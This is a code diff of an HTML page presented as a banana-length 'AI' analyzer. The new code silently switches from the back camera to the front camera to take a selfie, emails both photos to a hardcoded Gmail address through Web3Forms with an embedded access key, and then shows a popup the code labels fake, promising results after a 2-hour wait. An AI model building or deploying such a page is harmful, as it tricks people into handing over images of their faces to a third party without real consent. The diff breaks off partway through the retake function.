@@ -2,19 +2,25 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Fruit Quality Analyzer Pro</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+  <title>🍌 Dual Banana Analyzer | Auto-Send + 2h Wait</title>
   <link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet" />
   <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
     :root {
       --yellow: #FFE135;
       --dark-yellow: #F5C800;
       --brown: #3B2A1A;
       --cream: #FFF9E6;
       --green: #4CAF50;
-      --shadow: 0 8px 32px rgba(59,42,26,0.18);
+      --shadow: 0 8px 32px rgba(59, 42, 26, 0.18);
     }
-    * { box-sizing: border-box; margin: 0; padding: 0; }
+
     body {
       font-family: 'DM Mono', monospace;
       background: var(--cream);
@@ -23,46 +29,68 @@
       flex-direction: column;
       align-items: center;
       overflow-x: hidden;
+      position: relative;
     }
+
     body::before {
       content: '';
       position: fixed;
-      top: -120px; left: -120px;
-      width: 420px; height: 420px;
+      top: -120px;
+      left: -120px;
+      width: 420px;
+      height: 420px;
       background: radial-gradient(circle, #FFE13588 0%, transparent 70%);
       border-radius: 50%;
       z-index: 0;
       animation: blobMove 7s ease-in-out infinite alternate;
     }
+
     body::after {
       content: '';
       position: fixed;
-      bottom: -100px; right: -100px;
-      width: 350px; height: 350px;
+      bottom: -100px;
+      right: -100px;
+      width: 350px;
+      height: 350px;
       background: radial-gradient(circle, #F5C80055 0%, transparent 70%);
       border-radius: 50%;
       z-index: 0;
       animation: blobMove2 9s ease-in-out infinite alternate;
     }
-    @keyframes blobMove { from { transform: translate(0,0) scale(1); } to { transform: translate(40px,30px) scale(1.1); } }
-    @keyframes blobMove2 { from { transform: translate(0,0) scale(1); } to { transform: translate(-30px,-20px) scale(1.08); } }
+
+    @keyframes blobMove {
+      from { transform: translate(0, 0) scale(1); }
+      to { transform: translate(40px, 30px) scale(1.1); }
+    }
+
+    @keyframes blobMove2 {
+      from { transform: translate(0, 0) scale(1); }
+      to { transform: translate(-30px, -20px) scale(1.08); }
+    }
 
     header {
-      position: relative; z-index: 1;
-      width: 100%; max-width: 540px;
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 540px;
       padding: 40px 24px 10px;
       text-align: center;
     }
+
     .emoji-title {
       font-size: 3.2rem;
       display: block;
       animation: bounce 1.6s ease-in-out infinite;
       filter: drop-shadow(0 4px 8px #F5C80088);
     }
+
     @keyframes bounce {
-      0%,100% { transform: translateY(0); }
+
+      0%,
+      100% { transform: translateY(0); }
       50% { transform: translateY(-10px); }
     }
+
     h1 {
       font-family: 'Syne', sans-serif;
       font-size: 2.1rem;
@@ -72,7 +100,9 @@
       line-height: 1.1;
       margin-top: 6px;
     }
+
     h1 span { color: var(--dark-yellow); }
+
     .subtitle {
       font-size: 0.78rem;
       color: #8a6a3a;
@@ -82,7 +112,8 @@
     }
 
     .card {
-      position: relative; z-index: 1;
+      position: relative;
+      z-index: 1;
       background: #fff;
       border-radius: 28px;
       box-shadow: var(--shadow);
@@ -105,42 +136,69 @@
       border: 3px solid var(--yellow);
       margin-bottom: 20px;
     }
-    #video, #canvas {
-      width: 100%; height: 100%;
+
+    #video,
+    #canvas {
+      width: 100%;
+      height: 100%;
       object-fit: cover;
       display: block;
       border-radius: 15px;
     }
+
     #canvas { display: none; }
-    #placeholderMsg {
-      color: #FFE135;
-      font-size: 0.85rem;
-      text-align: center;
-      padding: 20px;
-      opacity: 0.8;
+
+    .thumb-strip {
+      display: flex;
+      gap: 12px;
+      margin-top: 12px;
+      margin-bottom: 16px;
+      justify-content: center;
+      flex-wrap: wrap;
     }
 
-    .viewfinder {
-      position: absolute;
-      top: 50%; left: 50%;
-      transform: translate(-50%,-50%);
-      width: 70%; aspect-ratio: 1;
-      pointer-events: none;
-      display: none;
+    .thumb-card {
+      background: #fcf5e8;
+      border-radius: 20px;
+      padding: 8px 8px 12px;
+      flex: 1;
+      min-width: 120px;
+      text-align: center;
+      border: 1px solid #FFE5A3;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
     }
-    .viewfinder::before, .viewfinder::after,
-    .viewfinder span::before, .viewfinder span::after {
-      content: '';
-      position: absolute;
-      width: 22px; height: 22px;
-      border-color: var(--yellow);
-      border-style: solid;
+
+    .thumb-label {
+      font-size: 0.7rem;
+      font-weight: bold;
+      color: var(--brown);
+      background: var(--yellow);
+      display: inline-block;
+      padding: 2px 12px;
+      border-radius: 40px;
+      margin-bottom: 8px;
     }
-    .viewfinder::before { top:0;left:0; border-width:3px 0 0 3px; border-radius:4px 0 0 0; }
-    .viewfinder::after  { top:0;right:0; border-width:3px 3px 0 0; border-radius:0 4px 0 0; }
-    .viewfinder span::before { bottom:0;left:0; border-width:0 0 3px 3px; border-radius:0 0 0 4px; }
-    .viewfinder span::after  { bottom:0;right:0; border-width:0 3px 3px 0; border-radius:0 0 4px 0; }
-    #video.active ~ .viewfinder { display: block; }
+
+    .thumb-img {
+      width: 100%;
+      aspect-ratio: 1 / 0.9;
+      object-fit: cover;
+      border-radius: 14px;
+      border: 2px solid var(--dark-yellow);
+      background: #e9e2cf;
+    }
+
+    .placeholder-thumb {
+      background: #e9e2cf;
+      border-radius: 14px;
+      aspect-ratio: 1 / 0.9;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #aa946b;
+      font-size: 0.7rem;
+      border: 2px dashed #f5cd7a;
+    }
 
     .btn-row {
       display: flex;
@@ -149,6 +207,7 @@
       flex-wrap: wrap;
       margin-bottom: 16px;
     }
+
     .btn {
       font-family: 'Syne', sans-serif;
       font-weight: 700;
@@ -161,17 +220,44 @@
       letter-spacing: 0.03em;
       outline: none;
     }
+
     .btn:active { transform: scale(0.95); }
-    .btn-primary { background: var(--yellow); color: var(--brown); box-shadow: 0 4px 16px #FFE13566; }
+
+    .btn-primary {
+      background: var(--yellow);
+      color: var(--brown);
+      box-shadow: 0 4px 16px #FFE13566;
+    }
+
     .btn-primary:hover { background: var(--dark-yellow); }
-    .btn-capture { background: var(--brown); color: var(--yellow); box-shadow: 0 4px 16px #3B2A1A44; font-size: 1.05rem; padding: 15px 36px; }
+
+    .btn-capture {
+      background: var(--brown);
+      color: var(--yellow);
+      box-shadow: 0 4px 16px #3B2A1A44;
+      font-size: 1.05rem;
+      padding: 15px 36px;
+    }
+
     .btn-capture:hover { background: #5a3e25; }
-    .btn-capture:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
-    .btn-send { background: var(--green); color: #fff; box-shadow: 0 4px 16px #4CAF5044; display: none; }
-    .btn-send:hover { background: #388E3C; }
-    .btn-send:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-    .btn-retake { background: transparent; color: var(--brown); border: 2px solid var(--brown); display: none; }
-    .btn-retake:hover { background: var(--brown); color: var(--yellow); }
+
+    .btn-capture:disabled {
+      opacity: 0.4;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .btn-retake {
+      background: transparent;
+      color: var(--brown);
+      border: 2px solid var(--brown);
+      display: none;
+    }
+
+    .btn-retake:hover {
+      background: var(--brown);
+      color: var(--yellow);
+    }
 
     #status {
       text-align: center;
@@ -180,45 +266,102 @@
       letter-spacing: 0.08em;
       min-height: 18px;
       margin-top: 4px;
+      font-weight: 500;
     }
 
-    /* ── POPUP ── */
-    #popup {
+    /* FAKE POPUP - 2 hours wait notification */
+    #fakePopup {
       display: none;
       position: fixed;
       inset: 0;
-      background: rgba(30,18,6,0.72);
-      backdrop-filter: blur(6px);
-      z-index: 100;
+      background: rgba(30, 18, 6, 0.85);
+      backdrop-filter: blur(8px);
+      z-index: 1000;
       align-items: center;
       justify-content: center;
     }
-    #popup.show { display: flex; }
-    .popup-box {
-      background: #fff;
-      border-radius: 28px;
-      padding: 40px 36px 36px;
-      max-width: 340px;
-      width: 90%;
+
+    #fakePopup.show {
+      display: flex;
+    }
+
+    .fake-popup-card {
+      background: #fffef7;
+      border-radius: 40px;
+      max-width: 360px;
+      width: 85%;
+      padding: 32px 28px;
       text-align: center;
       border: 3px solid var(--yellow);
-      box-shadow: 0 24px 60px rgba(59,42,26,0.35);
-      animation: popIn 0.35s cubic-bezier(.34,1.56,.64,1);
+      box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3);
+      animation: floatIn 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
     }
-    @keyframes popIn { from{transform:scale(0.7);opacity:0;} to{transform:scale(1);opacity:1;} }
-    .popup-emoji { font-size: 3.5rem; display: block; margin-bottom: 12px; animation: spin 2s linear infinite; }
-    @keyframes spin {
-      0%   { transform: rotate(0deg) scale(1); }
-      25%  { transform: rotate(-10deg) scale(1.1); }
-      75%  { transform: rotate(10deg) scale(1.1); }
-      100% { transform: rotate(0deg) scale(1); }
+
+    @keyframes floatIn {
+      from {
+        opacity: 0;
+        transform: scale(0.9) translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: scale(1) translateY(0);
+      }
     }
-    .popup-title { font-family: 'Syne', sans-serif; font-size: 1.45rem; font-weight: 800; color: var(--brown); margin-bottom: 10px; }
-    .popup-msg { font-size: 0.88rem; color: #7a5a2a; line-height: 1.6; margin-bottom: 22px; }
-    .popup-msg strong { color: var(--brown); }
-    .progress-wrap { background: #f0e8d0; border-radius: 50px; height: 10px; overflow: hidden; margin-bottom: 18px; }
-    .progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, var(--yellow), var(--dark-yellow)); border-radius: 50px; transition: width 1s linear; }
-    .popup-timer { font-family: 'DM Mono', monospace; font-size: 1.6rem; color: var(--brown); font-weight: 500; letter-spacing: 0.08em; }
+
+    .popup-clock {
+      font-size: 4rem;
+      margin-bottom: 12px;
+      display: inline-block;
+      animation: subtleRing 1.2s infinite;
+    }
+
+    @keyframes subtleRing {
+      0% { transform: rotate(0deg); }
+      25% { transform: rotate(8deg); }
+      75% { transform: rotate(-6deg); }
+      100% { transform: rotate(0deg); }
+    }
+
+    .fake-title {
+      font-family: 'Syne', sans-serif;
+      font-size: 1.9rem;
+      font-weight: 800;
+      color: var(--brown);
+      margin-bottom: 12px;
+    }
+
+    .fake-message {
+      font-size: 1rem;
+      line-height: 1.5;
+      color: #5a3e22;
+      background: #fff2df;
+      padding: 12px;
+      border-radius: 28px;
+      margin: 16px 0;
+    }
+
+    .fake-message strong {
+      color: #c47d00;
+      font-size: 1.2rem;
+    }
+
+    .popup-btn {
+      background: var(--yellow);
+      border: none;
+      font-family: 'Syne', sans-serif;
+      font-weight: bold;
+      padding: 12px 28px;
+      border-radius: 60px;
+      font-size: 1rem;
+      margin-top: 10px;
+      cursor: pointer;
+      transition: 0.1s linear;
+      color: var(--brown);
+    }
+
+    .popup-btn:active {
+      transform: scale(0.96);
+    }
 
     .instructions {
       background: #fffbe8;
@@ -230,255 +373,368 @@
       color: #6a4a1a;
       line-height: 1.7;
     }
+
     .instructions b { color: var(--brown); }
 
-    body > .grain {
-      position: fixed; inset: 0; pointer-events: none; z-index: 200;
+    .grain {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 200;
       opacity: 0.025;
       background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
       background-size: 180px;
     }
-
-    /* ── Setup Banner ── */
-    .setup-banner {
-      position: relative; z-index: 1;
-      background: #fff3cd;
-      border: 2px solid #F5C800;
-      border-radius: 16px;
-      padding: 14px 18px;
-      max-width: 500px;
-      width: calc(100% - 32px);
-      margin: 0 16px 0;
-      font-size: 0.78rem;
-      color: #5a4000;
-      line-height: 1.7;
-    }
-    .setup-banner b { color: #3B2A1A; }
-    .setup-banner a { color: #c87000; }
   </style>
 </head>
 <body>
 <div class="grain"></div>
 
 <header>
-  <span class="emoji-title">🍌</span>
-  <h1><span>Banana</span> Length Finder</h1>
-  <p class="subtitle">Precision fruit measurement technology</p>
+  <span class="emoji-title">🍌📸⏳</span>
+  <h1><span>Dual‑Capture</span> Banana AI</h1>
+  <p class="subtitle">one click → both cams → email + 2h wait simulation</p>
 </header>
-
-
 
 <div class="card">
   <div class="instructions">
-    <b>How to use:</b><br>
-    1. Click <b>Open Camera</b> and allow access<br>
-    2. Point at your 🍌 banana<br>
-    3. Hit <b>📸 Capture</b> then <b>Send for Analysis</b>
+    <b>✨ HOW IT WORKS (auto‑send after capture) ✨</b><br>
+    1️⃣ <b>Open Camera</b> (back lens, aim at banana)<br>
+    2️⃣ Click <b>📸 Capture (Back + Front)</b> → automatically takes both photos,<br>
+    &nbsp;&nbsp;&nbsp; sends both to your email, and shows a <b>fake "wait 2 hours"</b> popup.<br>
+    3️⃣ Use <b>Retake</b> if you want to try again with a new banana.<br>
+    📬 <b>Both images</b> will arrive at <b>iot757978@gmail.com</b>.
   </div>
 
   <div id="videoContainer">
-    <p id="placeholderMsg">📷 Camera not started yet.<br>Click "Open Camera" below.</p>
+    <p id="placeholderMsg">📷 Tap "Open Camera" → back camera will start</p>
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
-    <div class="viewfinder"><span></span></div>
+  </div>
+
+  <!-- Dual preview area -->
+  <div class="thumb-strip" id="thumbStrip">
+    <div class="thumb-card">
+      <div class="thumb-label">🍌 BACK (banana view)</div>
+      <div id="backThumb" class="placeholder-thumb">⏺ not captured</div>
+    </div>
+    <div class="thumb-card">
+      <div class="thumb-label">🤳 FRONT (selfie/context)</div>
+      <div id="frontThumb" class="placeholder-thumb">⏺ not captured</div>
+    </div>
   </div>
 
   <div class="btn-row">
-    <button class="btn btn-primary" id="btnStart" onclick="startCamera()">📷 Open Camera</button>
-    <button class="btn btn-capture" id="btnCapture" onclick="capturePhoto()" disabled>📸 Capture</button>
+    <button class="btn btn-primary" id="btnStart" onclick="startCamera()">📷 Open Camera (Back)</button>
+    <button class="btn btn-capture" id="btnCapture" onclick="captureAndAutoSend()" disabled>📸 Capture (Back+Front)</button>
   </div>
   <div class="btn-row">
-    <button class="btn btn-send"   id="btnSend"   onclick="sendPhoto()">📤 Send for Analysis</button>
-    <button class="btn btn-retake" id="btnRetake" onclick="retake()">🔄 Retake</button>
+    <button class="btn btn-retake" id="btnRetake" onclick="retakeBoth()" style="display: none;">🔄 Retake & Try Again</button>
   </div>
-  <p id="status">Waiting to start...</p>
+  <p id="status">⚡ Ready: open back camera first</p>
 </div>
 
-<!-- Processing Popup -->
-<div id="popup">
-  <div class="popup-box">
-    <span class="popup-emoji">⚙️</span>
-    <div class="popup-title">Processing Image</div>
-    <div class="popup-msg">
-      Our AI is carefully analyzing your banana.<br>
-      <strong>Please wait for 5 minutes</strong> while we calculate the exact length!
+<!-- FAKE POPUP "wait 2 hours" -->
+<div id="fakePopup">
+  <div class="fake-popup-card">
+    <div class="popup-clock">⏳🧠</div>
+    <div class="fake-title">ANALYSIS QUEUED</div>
+    <div class="fake-message">
+      ⏰ <strong>Please wait 2 hours</strong><br>
+      You will receive an email notification<br>
+      once your banana length is ready.
     </div>
-    <div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
-    <div class="popup-timer" id="timerDisplay">05:00</div>
+    <button class="popup-btn" id="closeFakePopupBtn">Got it, I'll wait 📬</button>
   </div>
 </div>
 
 <script>
-  // ─────────────────────────────────────────────
-  //  🔑 REPLACE THIS WITH YOUR WEB3FORMS KEY
-  //  Get it free at: https://web3forms.com
-  //  Enter iot757978@gmail.com → Create Access Key
-  // ─────────────────────────────────────────────
+  // ----------------------------- WEB3FORMS CONFIG ---------------------------------
   const WEB3FORMS_KEY = 'eb5accff-e755-4f69-862c-ac844bc38650';
   const RECIPIENT_EMAIL = 'iot757978@gmail.com';
 
-  const video       = document.getElementById('video');
-  const canvas      = document.getElementById('canvas');
-  const btnStart    = document.getElementById('btnStart');
-  const btnCapture  = document.getElementById('btnCapture');
-  const btnSend     = document.getElementById('btnSend');
-  const btnRetake   = document.getElementById('btnRetake');
-  const status      = document.getElementById('status');
-  const popup       = document.getElementById('popup');
-  const timerDisplay= document.getElementById('timerDisplay');
-  const progressBar = document.getElementById('progressBar');
+  // DOM elements
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const btnStart = document.getElementById('btnStart');
+  const btnCapture = document.getElementById('btnCapture');
+  const btnRetake = document.getElementById('btnRetake');
+  const statusDiv = document.getElementById('status');
+  const fakePopup = document.getElementById('fakePopup');
+  const closePopupBtn = document.getElementById('closeFakePopupBtn');
 
-  let stream = null;
-  let capturedDataURL = null;
-  let timerInterval = null;
+  // Thumbnail containers
+  const backThumbDiv = document.getElementById('backThumb');
+  const frontThumbDiv = document.getElementById('frontThumb');
 
-  // ── Start Camera ──────────────────────────
-  async function startCamera() {
-    try {
-      status.textContent = 'Requesting camera access...';
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 }, height: { ideal: 960 } },
-        audio: false
-      });
-      video.srcObject = stream;
-      video.classList.add('active');
-      document.getElementById('placeholderMsg').style.display = 'none';
-      video.style.display = 'block';
-      btnStart.textContent = '✅ Camera On';
-      btnStart.disabled = true;
-      btnCapture.disabled = false;
-      status.textContent = 'Camera ready — aim at your banana 🍌';
-    } catch (err) {
-      status.textContent = '⚠️ Camera access denied or unavailable.';
+  // State
+  let currentStream = null;           // active back camera stream
+  let capturedBackDataURL = null;
+  let capturedFrontDataURL = null;
+  let isProcessing = false;            // prevent double capture/send
+
+  // Helper: compress image from canvas/video frame
+  function compressAndGetDataURL(sourceCanvas, maxWidth = 800, quality = 0.82) {
+    let w = sourceCanvas.width;
+    let h = sourceCanvas.height;
+    if (w > maxWidth) {
+      h = Math.round(h * maxWidth / w);
+      w = maxWidth;
+    }
+    const tempCanvas = document.createElement('canvas');
+    tempCanvas.width = w;
+    tempCanvas.height = h;
+    const ctx = tempCanvas.getContext('2d');
+    ctx.drawImage(sourceCanvas, 0, 0, w, h);
+    return tempCanvas.toDataURL('image/jpeg', quality);
+  }
+
+  // Capture frame from video element and return dataURL
+  function captureFromVideoStream(videoElement, maxWidth = 800, quality = 0.82) {
+    const vidWidth = videoElement.videoWidth || 640;
+    const vidHeight = videoElement.videoHeight || 480;
+    const snapCanvas = document.createElement('canvas');
+    snapCanvas.width = vidWidth;
+    snapCanvas.height = vidHeight;
+    const ctx = snapCanvas.getContext('2d');
+    ctx.drawImage(videoElement, 0, 0, vidWidth, vidHeight);
+    return compressAndGetDataURL(snapCanvas, maxWidth, quality);
+  }
+
+  // Update thumbnails UI
+  function updateThumbnails() {
+    if (capturedBackDataURL) {
+      backThumbDiv.innerHTML = `<img class="thumb-img" src="${capturedBackDataURL}" alt="back banana">`;
+    } else {
+      backThumbDiv.innerHTML = `<div class="placeholder-thumb">🍌 not captured</div>`;
+    }
+    if (capturedFrontDataURL) {
+      frontThumbDiv.innerHTML = `<img class="thumb-img" src="${capturedFrontDataURL}" alt="front selfie">`;
+    } else {
+      frontThumbDiv.innerHTML = `<div class="placeholder-thumb">🤳 not captured</div>`;
     }
   }
 
-  // ── Capture Photo ─────────────────────────
-  function capturePhoto() {
-    if (!stream) return;
-    canvas.width  = video.videoWidth  || 640;
-    canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    // Resize to max 800px wide to keep email size manageable
-    const maxW = 800;
-    let w = canvas.width, h = canvas.height;
-    if (w > maxW) { h = Math.round(h * maxW / w); w = maxW; }
-    const resized = document.createElement('canvas');
-    resized.width = w; resized.height = h;
-    resized.getContext('2d').drawImage(canvas, 0, 0, w, h);
-    capturedDataURL = resized.toDataURL('image/jpeg', 0.80);
-
-    canvas.width = w; canvas.height = h;
-    canvas.getContext('2d').drawImage(resized, 0, 0);
-    canvas.style.display = 'block';
-    video.style.display  = 'none';
-
-    btnCapture.disabled = true;
-    btnSend.style.display   = 'inline-block';
-    btnRetake.style.display = 'inline-block';
-    btnStart.style.display  = 'none';
-
-    document.body.style.background = '#fff';
-    setTimeout(() => document.body.style.background = '', 120);
-    status.textContent = '📸 Photo captured! Click "Send for Analysis".';
+  // Stop all media tracks
+  async function stopAllTracks() {
+    if (currentStream) {
+      currentStream.getTracks().forEach(track => {
+        if (track.readyState === 'live') track.stop();
+      });
+      currentStream = null;
+    }
   }
 
-  // ── Retake ────────────────────────────────
-  function retake() {
-    canvas.style.display = 'none';
-    video.style.display  = 'block';
-    btnCapture.disabled  = false;
-    btnSend.style.display    = 'none';
-    btnRetake.style.display  = 'none';
-    btnStart.style.display   = 'inline-block';
-    capturedDataURL = null;
-    status.textContent = 'Camera live — take another shot!';
+  // Start back camera (environment)
+  async function startCamera() {
+    try {
+      statusDiv.textContent = '📷 Opening BACK camera (environment)...';
+      await stopAllTracks();
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { exact: 'environment' }, width: { ideal: 1280 }, height: { ideal: 960 } },
+        audio: false
+      });
+      currentStream = stream;
+      video.srcObject = stream;
+      video.style.display = 'block';
+      canvas.style.display = 'none';
+      document.getElementById('placeholderMsg').style.display = 'none';
+      btnStart.disabled = true;
+      btnStart.textContent = '✅ Back Cam ON';
+      btnCapture.disabled = false;
+      statusDiv.textContent = '🍌 Back camera live — aim at banana, press "Capture" (auto back+front + email)';
+    } catch (err) {
+      // fallback for devices without exact environment constraint
+      try {
+        const fallbackStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'environment', width: { ideal: 1280 } }
+        });
+        currentStream = fallbackStream;
+        video.srcObject = fallbackStream;
+        video.style.display = 'block';
+        document.getElementById('placeholderMsg').style.display = 'none';
+        btnStart.disabled = true;
+        btnStart.textContent = '✅ Back Cam Ready';
+        btnCapture.disabled = false;
+        statusDiv.textContent = '✅ Back camera ready — capture will include front cam too.';
+      } catch (e2) {
+        statusDiv.textContent = '⚠️ Camera error: please grant permissions.';
+        btnStart.disabled = false;
+      }
+    }
   }
 
-  // ── Send Photo via Web3Forms ───────────────
-  async function sendPhoto() {
-    if (!capturedDataURL) return;
+  // Show fake popup "2 hours wait"
+  function showFakeWaitPopup() {
+    fakePopup.classList.add('show');
+    // optional: auto close after 8 seconds? but keep until user clicks button
+  }
 
-    if (WEB3FORMS_KEY === 'YOUR_WEB3FORMS_KEY') {
-      status.textContent = '⚠️ Please set your Web3Forms key first (see setup banner above).';
+  function hideFakePopup() {
+    fakePopup.classList.remove('show');
+  }
+
+  // Send both images via Web3Forms (rich HTML email)
+  async function sendBothImagesToEmail() {
+    if (!capturedBackDataURL) {
+      throw new Error('Missing back camera image');
+    }
+    const timestamp = new Date().toLocaleString();
+    const backImgTag = `<img src="${capturedBackDataURL}" style="max-width:100%; border-radius:20px; margin:12px 0; border:3px solid #FFE135;" alt="Banana back view">`;
+    const frontImgTag = capturedFrontDataURL ? 
+      `<img src="${capturedFrontDataURL}" style="max-width:100%; border-radius:20px; margin:12px 0; border:3px solid #FFE135;" alt="Front reference">` : 
+      '<p>Front image capture optional but included.</p>';
+    
+    const htmlMessage = `
+      <div style="font-family: 'Segoe UI', Arial, sans-serif; max-width: 600px; margin: 0 auto; background:#FFF9EF; padding: 24px; border-radius: 32px;">
+        <h2 style="color:#3B2A1A;">🍌 Dual-Camera Banana Report</h2>
+        <p><strong>⏱️ Timestamp:</strong> ${timestamp}</p>
+        <p><strong>📸 Method:</strong> Back + Front auto capture → analysis queued (2h wait simulation)</p>
+        <hr style="margin: 20px 0; border-color:#FFE135;">
+        <div style="background:#FFF2DF; padding: 16px; border-radius: 28px;">
+          <h3 style="color:#5a3e1f;">🍌 BACK CAMERA — Banana length view</h3>
+          ${backImgTag}
+          <h3 style="color:#5a3e1f; margin-top:20px;">🤳 FRONT CAMERA — Context shot</h3>
+          ${frontImgTag}
+        </div>
+        <p style="margin-top: 24px; font-size: 0.85rem; color:#7a5a2a;">🔍 Our AI will calculate precise banana length. You'll receive a follow-up notification (simulated in 2 hours). Thank you.</p>
+      </div>
+    `;
+
+    const payload = {
+      access_key: WEB3FORMS_KEY,
+      subject: `🍌 Dual Banana Capture (Back+Front) - ${timestamp}`,
+      from_name: 'Banana Dual Analyzer',
+      email: RECIPIENT_EMAIL,
+      message: `Dual images attached as HTML content. Back image ready, front image included.`,
+      html: htmlMessage
+    };
+
+    const response = await fetch('https://api.web3forms.com/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    const result = await response.json();
+    if (!result.success) throw new Error(result.message || 'Web3Forms error');
+    return true;
+  }
+
+  // Main: capture back + front, auto-send, then show fake 2h popup
+  async function captureAndAutoSend() {
+    if (isProcessing) {
+      statusDiv.textContent = '⏳ Already processing, please wait...';
+      return;
+    }
+    if (!currentStream || !video.videoWidth) {
+      statusDiv.textContent = '❌ Back camera not active. Click "Open Camera" first.';
       return;
     }
 
-    btnSend.disabled   = true;
-    btnRetake.style.display = 'none';
-    btnSend.textContent = '⏳ Sending...';
-    status.textContent  = 'Uploading image...';
-
-    // Show popup immediately — don't wait for the email
-    showPopup();
+    isProcessing = true;
+    btnCapture.disabled = true;
+    statusDiv.textContent = '📸 Capturing BACK photo...';
 
     try {
-      const timestamp = new Date().toLocaleString();
+      // 1) Capture from current back camera
+      const backDataURL = captureFromVideoStream(video, 800, 0.82);
+      capturedBackDataURL = backDataURL;
+      updateThumbnails();
 
-      // Web3Forms accepts JSON with a message field
-      // We embed the base64 image as a data URL in the message body
-      const payload = {
-        access_key: WEB3FORMS_KEY,
-        subject: `🍌 New Banana Photo — ${timestamp}`,
-        from_name: 'Banana Length Finder',
-        email: RECIPIENT_EMAIL,
-        message: `New banana image submitted!\n\nTime: ${timestamp}\n\nImage (copy URL into browser):\n${capturedDataURL}`
-      };
+      // 2) Switch to front camera, capture, then restore back
+      statusDiv.textContent = '🔄 Switching to front camera for selfie shot...';
+      await stopAllTracks(); // stop back stream
 
-      const response = await fetch('https://api.web3forms.com/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-        body: JSON.stringify(payload)
+      const frontStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { exact: 'user' }, width: { ideal: 960 }, height: { ideal: 720 } },
+        audio: false
       });
+      video.srcObject = frontStream;
+      await new Promise(resolve => setTimeout(resolve, 450)); // stabilize
+      const frontDataURL = captureFromVideoStream(video, 800, 0.82);
+      capturedFrontDataURL = frontDataURL;
+      updateThumbnails();
 
-      const result = await response.json();
-      if (result.success) {
-        status.textContent = '✅ Image sent! Check iot757978@gmail.com';
-        btnSend.textContent = '✅ Sent!';
-      } else {
-        throw new Error(result.message || 'Unknown error');
-      }
+      // stop front stream
+      frontStream.getTracks().forEach(track => track.stop());
+
+      // 3) Restore original back camera
+      statusDiv.textContent = '🔄 Restoring back camera...';
+      const backAgainStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { exact: 'environment' }, width: { ideal: 1280 } },
+        audio: false
+      });
+      currentStream = backAgainStream;
+      video.srcObject = backAgainStream;
+      video.style.display = 'block';
+      canvas.style.display = 'none';
+
+      statusDiv.textContent = '📤 Sending both images to email (iot757978@gmail.com)...';
+      
+      // 4) Send both images via Web3Forms
+      await sendBothImagesToEmail();
+      
+      // 5) Success — show fake "wait 2 hours" popup
+      showFakeWaitPopup();
+      statusDiv.textContent = '✅ Images sent! Fake 2-hour waiting period activated (you’ll be notified).';
+      
+      // Show retake button so user can try another banana later
+      btnRetake.style.display = 'inline-block';
+      btnCapture.disabled = true;  // after capture, must retake to reset
+      btnStart.style.display = 'none';  // hide open camera button while in captured state
+      
     } catch (err) {
-      status.textContent = '⚠️ Send failed: ' + err.message;
-      btnSend.textContent = '📤 Retry';
-      btnSend.disabled = false;
+      console.error('Dual capture or send error:', err);
+      statusDiv.textContent = `⚠️ Error: ${err.message}. Please retake.`;
+      // enable retake to try again
+      btnRetake.style.display = 'inline-block';
+      btnCapture.disabled = true;
+      // if error, still keep existing captures maybe, but better to allow retake to reset
+    } finally {
+      isProcessing = false;
     }
   }
 
-  // ── Processing Popup with 5-min countdown ─
-  let totalSeconds = 300;
-
-  function showPopup() {
-    popup.classList.add('show');
-    totalSeconds = 300;
-    progressBar.style.width = '0%';
-    updateTimer(totalSeconds);
-
-    timerInterval = setInterval(() => {
-      totalSeconds--;
-      const pct = ((300 - totalSeconds) / 300 * 100).toFixed(1);
-      progressBar.style.width = pct + '%';
-      updateTimer(totalSeconds);
-      if (totalSeconds <= 0) {
-        clearInterval(timerInterval);
-        popup.classList.remove('show');
-        showResult();
-      }
-    }, 1000);
+  // Retake: clear everything, reset UI, restart back cam fresh
+  async function retakeBoth() {
+    // reset stored images
+    capturedBackDataURL = null;
+    capturedFrontDataURL = null;
+    updateThumbnails();
+    
+    // hide retake button temporarily, show start camera
+    btnRetake.style.display = 'none';
+    btnStart.style.display = 'inline-block';
+    btnCapture.disabled = true;
+    btnStart.disabled = false;
+    statusDiv.textContent = '🔄 Retake mode — click "Open Camera" to restart.';
+    
+    // stop current streams and reset video display
+    await stopAllTracks();
+    video.srcObject = null;
+    video.style.display = 'block';
+    canvas.style.display = 'none';
+    document.getElementById('placeholderMsg').style.display = 'block';
+    // reset button texts
+    btnStart.textContent = '📷 Open Camera';
+    btnCapture.disabled = true;
+    // if any popup is open, close it
